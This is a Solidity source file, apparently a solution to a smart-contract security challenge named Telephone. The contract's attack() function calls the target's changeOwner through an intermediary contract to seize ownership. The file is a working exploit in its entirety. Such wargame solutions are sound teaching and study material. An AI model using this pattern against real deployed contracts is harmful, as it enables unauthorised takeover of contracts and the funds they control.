// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttackContract {
    address challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        ITelephone(challengeInstance).changeOwner(msg.sender);
    }
}
